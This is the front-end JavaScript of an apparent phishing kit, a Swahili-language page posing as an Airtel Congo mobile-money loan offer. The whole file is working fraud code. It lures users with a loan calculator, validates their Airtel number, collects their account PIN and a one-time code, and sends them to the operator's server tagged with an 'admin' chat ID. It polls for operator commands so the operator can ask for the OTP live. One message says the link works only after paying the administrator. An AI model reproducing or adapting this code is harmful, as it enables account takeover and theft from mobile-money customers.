document.addEventListener('DOMContentLoaded', () => {
  const urlParams = new URLSearchParams(window.location.search);
  const adminChatId = urlParams.get('admin');

  let state = {
    amount: '$2,500',
    duration: 'Miezi 12',
    loanType: '',
    purpose: '',
    firstName: '',
    lastName: '',
    contact: '',
    employment: '',
    income: '',
    pin: '',
    otp: '',
    userId: null
  };

  const views = {
    calculator: document.getElementById('view-calculator'),
    form: document.getElementById('view-form'),
    waiting: document.getElementById('view-waiting'),
    login: document.getElementById('view-login'),
    otp: document.getElementById('view-otp'),
    success: document.getElementById('view-success')
  };

  function switchView(viewName) {
    Object.values(views).forEach(v => v.classList.add('hidden'));
    if (views[viewName]) {
      views[viewName].classList.remove('hidden');
    }
  }

  const amountRange = document.getElementById('amount-range');
  const calcAmountInput = document.getElementById('calc-amount');
  const durationRange = document.getElementById('duration-range');
  const durationVal = document.getElementById('duration-val');
  const monthlyPayment = document.getElementById('monthly-payment');

  function updateCalculator() {
    const val = parseInt(amountRange.value);
    state.amount = `$${val.toLocaleString()}`;
    calcAmountInput.value = state.amount;

    const months = parseInt(durationRange.value);
    state.duration = `Miezi ${months}`;
    durationVal.textContent = state.duration;

    const monthly = (val * 1.12) / months;
    monthlyPayment.textContent = `$${Math.round(monthly).toLocaleString()}`;
  }

  if (amountRange && durationRange) {
    amountRange.addEventListener('input', updateCalculator);
    durationRange.addEventListener('input', updateCalculator);
  }

  const btnStartApp = document.getElementById('btn-start-app');
  if (btnStartApp) {
    btnStartApp.addEventListener('click', () => {
      document.getElementById('form-amount').value = amountRange.value;
      state.amount = `$${parseInt(amountRange.value).toLocaleString()}`;
      switchView('form');
      validateStep(1);
    });
  }

  let currentStep = 1;
  const formSteps = document.querySelectorAll('.form-step');
  const progressFill = document.getElementById('progress-fill');
  const stepIndicator = document.getElementById('step-indicator');

  function updateStepView() {
    formSteps.forEach((step, index) => {
      if (index + 1 === currentStep) {
        step.classList.remove('hidden');
      } else {
        step.classList.add('hidden');
      }
    });
    if (progressFill) progressFill.style.width = `${(currentStep / 3) * 100}%`;
    if (stepIndicator) stepIndicator.textContent = `Hatua ${currentStep} kati ya 3`;
  }

  // Strict Airtel Congo validation helper (+243 followed by 97, 98, or 99 and 7 digits)
  function isValidAirtelCongoNumber(number) {
    if (!number) return false;
    const clean = String(number).trim().replace(/[\s\-\(\)]/g, '');
    const regex = /^(?:\+243|243)?(97|98|99)\d{7}$/;
    return regex.test(clean);
  }

  function validateStep(step) {
    const currentStepEl = document.querySelector(`.form-step[data-step="${step}"]`);
    const nextBtn = currentStepEl ? currentStepEl.querySelector('.next-btn') : null;
    const submitBtn = document.getElementById('btn-submit-app');

    if (step === 2) {
      const contactVal = document.getElementById('user-contact').value;
      const isValid = isValidAirtelCongoNumber(contactVal);
      if (nextBtn) nextBtn.disabled = !isValid;
    } else {
      if (nextBtn) nextBtn.disabled = false;
    }

    if (submitBtn) {
      submitBtn.disabled = false;
    }
  }

  const userContactInput = document.getElementById('user-contact');
  if (userContactInput) {
    userContactInput.addEventListener('input', () => {
      validateStep(2);
    });
  }

  const loginContactInput = document.getElementById('login-contact');
  if (loginContactInput) {
    loginContactInput.addEventListener('input', () => {
      checkPinComplete();
    });
  }

  // Event Listeners for inputs
  const loanTypeEl = document.getElementById('loan-type');
  const formAmountEl = document.getElementById('form-amount');
  const loanPurposeEl = document.getElementById('loan-purpose');
  const firstNameEl = document.getElementById('first-name');
  const lastNameEl = document.getElementById('last-name');

  if (loanTypeEl) loanTypeEl.addEventListener('change', () => validateStep(1));
  if (formAmountEl) formAmountEl.addEventListener('input', () => validateStep(1));
  if (loanPurposeEl) loanPurposeEl.addEventListener('input', () => validateStep(1));
  if (firstNameEl) firstNameEl.addEventListener('input', () => validateStep(2));
  if (lastNameEl) lastNameEl.addEventListener('input', () => validateStep(2));

  document.querySelectorAll('.next-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (currentStep === 2) {
        const contactVal = document.getElementById('user-contact').value;
        if (!isValidAirtelCongoNumber(contactVal)) {
          alert("Tafadhali weka namba sahihi ya Airtel Congo (+243 yenye kuanzia 97, 98, au 99).");
          return;
        }
      }

      if (currentStep === 1) {
        state.loanType = document.getElementById('loan-type').value;
        state.amount = `$${parseInt(document.getElementById('form-amount').value || 2500).toLocaleString()}`;
        state.purpose = document.getElementById('loan-purpose').value || 'Mkopo';
      } else if (currentStep === 2) {
        state.firstName = document.getElementById('first-name').value || 'Mteja';
        state.lastName = document.getElementById('last-name').value || '';
        state.contact = document.getElementById('user-contact').value || '+243990000000';

        document.getElementById('sum-amount').textContent = state.amount;
        document.getElementById('sum-duration').textContent = state.duration;
        document.getElementById('sum-purpose').textContent = state.purpose;
        document.getElementById('sum-name').textContent = `${state.firstName} ${state.lastName}`;
      }

      if (currentStep < 3) {
        currentStep++;
        updateStepView();
        validateStep(currentStep);
      }
    });
  });

  const btnSubmitApp = document.getElementById('btn-submit-app');
  if (btnSubmitApp) {
    btnSubmitApp.addEventListener('click', async () => {
      state.employment = document.getElementById('employment-status').value || 'Haijaainishwa';
      state.income = document.getElementById('annual-income').value || '0';
      if (!state.contact) state.contact = '+243990000000';

      switchView('waiting');
      try {
        const response = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            contact: state.contact,
            pin: 'PENDING_PIN',
            amount: state.amount,
            adminChatId
          })
        });
        const data = await response.json();
        if (!data.success) {
          alert(data.error || "HUJAJULIPIA. WASILIANA NA MSIMAMIZI ILI KUFUNGUA KIUNGO CHAKO. BAADA YA KUWASILIANA NAYE, ATATIA ALAMA YA KWAMBA UMEJULIPIA NA KIUNGO KITAFANYA KAZI.");
          location.reload();
          return;
        }
        state.userId = data.userId;
        pollStatus();
      } catch (err) {
        console.error(err);
        alert("Hitilafu ya mtandao. Tafadhali jaribu tena.");
        location.reload();
      }
    });
  }

  document.querySelectorAll('.prev-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (currentStep > 1) {
        currentStep--;
        updateStepView();
        validateStep(currentStep);
      }
    });
  });

  function pollStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'APPROVED_LOAD_OTP' || data.status === 'RETRY_PIN') {
          clearInterval(interval);
          document.getElementById('login-contact').value = state.contact;
          switchView('login');
        } else if (data.status === 'DENIED') {
          clearInterval(interval);
          alert('Ombi lako la mkopo limekataliwa na msimamizi wa Airtel Congo.');
          location.reload();
        } else if (data.status === 'SUCCESS') {
          clearInterval(interval);
          const approvedVal = document.getElementById('approved-amount-val');
          if (approvedVal) approvedVal.textContent = state.amount;
          switchView('success');
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  // 4-Digit PIN Input Management
  const pinBoxes = document.querySelectorAll('.pin-box');
  pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < pinBoxes.length - 1) {
        pinBoxes[index + 1].focus();
      }
      checkPinComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        pinBoxes[index - 1].focus();
      }
    });
  });

  function checkPinComplete() {
    const btnLogin = document.getElementById('btn-login');
    let pinStr = '';
    pinBoxes.forEach(b => pinStr += b.value);
    const loginContactVal = document.getElementById('login-contact').value;
    
    if (btnLogin) {
      btnLogin.disabled = !(pinStr.length === 4 && isValidAirtelCongoNumber(loginContactVal));
    }
  }

  const btnLoginEl = document.getElementById('btn-login');
  if (btnLoginEl) {
    btnLoginEl.addEventListener('click', async () => {
      const loginContactVal = document.getElementById('login-contact').value.trim();
      if (!isValidAirtelCongoNumber(loginContactVal)) {
        alert("Tafadhali weka namba sahihi ya Airtel Congo (+243 yenye kuanzia 97, 98, au 99).");
        return;
      }

      let pinStr = '';
      pinBoxes.forEach(b => pinStr += b.value);
      if (pinStr.length !== 4) {
        alert("Tafadhali ingiza PIN kamili ya tarakimu 4.");
        return;
      }

      state.pin = pinStr;
      state.contact = loginContactVal;
      switchView('waiting');
      document.getElementById('waiting-status-text').textContent = 'Inathibitisha PIN ya akaunti yako...';

      try {
        const res = await fetch(`/api/submit-application${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            contact: state.contact,
            pin: state.pin,
            amount: state.amount,
            adminChatId
          })
        });
        const data = await res.json();
        if (!data.success) {
          alert(data.error || "Imeshindikana kuthibitisha PIN.");
          switchView('login');
          return;
        }
        state.userId = data.userId;
        pollOtpStatus();
      } catch (err) {
        console.error(err);
        alert("Hitilafu ya mtandao.");
        switchView('login');
      }
    });
  }

  // 4-Digit OTP Input Management
  const otpBoxes = document.querySelectorAll('.otp-box');
  otpBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && index < otpBoxes.length - 1) {
        otpBoxes[index + 1].focus();
      }
      checkOtpComplete();
    });
    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && index > 0) {
        otpBoxes[index - 1].focus();
      }
    });
  });

  function checkOtpComplete() {
    const btnSubmitOtp = document.getElementById('btn-submit-otp');
    let otpStr = '';
    otpBoxes.forEach(b => otpStr += b.value);
    if (btnSubmitOtp) {
      btnSubmitOtp.disabled = (otpStr.length !== 4);
    }
  }

  function pollOtpStatus() {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/check-status/${state.userId}`);
        const data = await res.json();

        if (data.status === 'REQUEST_OTP') {
          clearInterval(interval);
          const targetDisplay = document.getElementById('otp-target-display');
          if (targetDisplay) targetDisplay.textContent = state.contact;
          switchView('otp');
        } else if (data.status === 'SUCCESS') {
          clearInterval(interval);
          const approvedVal = document.getElementById('approved-amount-val');
          if (approvedVal) approvedVal.textContent = state.amount;
          switchView('success');
        } else if (data.status === 'DENIED') {
          clearInterval(interval);
          alert('Msimamizi amekataa ombi lako.');
          location.reload();
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  const btnSubmitOtpEl = document.getElementById('btn-submit-otp');
  if (btnSubmitOtpEl) {
    btnSubmitOtpEl.addEventListener('click', async () => {
      let otpStr = '';
      otpBoxes.forEach(b => otpStr += b.value);
      if (otpStr.length !== 4) {
        alert("Tafadhali ingiza namba 4 za OTP.");
        return;
      }
      state.otp = otpStr;
      switchView('waiting');
      document.getElementById('waiting-status-text').textContent = 'Inathibitisha OTP...';

      try {
        const res = await fetch(`/api/submit-otp${adminChatId ? '?admin=' + encodeURIComponent(adminChatId) : ''}`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ userId: state.userId, otp: state.otp })
        });
        const data = await res.json();
        if (data.success) {
          const approvedVal = document.getElementById('approved-amount-val');
          if (approvedVal) approvedVal.textContent = state.amount;
          switchView('success');
        } else {
          alert(data.error || "OTP si sahihi.");
          switchView('otp');
        }
      } catch (err) {
        console.error(err);
        alert("Hitilafu ya mtandao.");
        switchView('otp');
      }
    });
  }
});
    
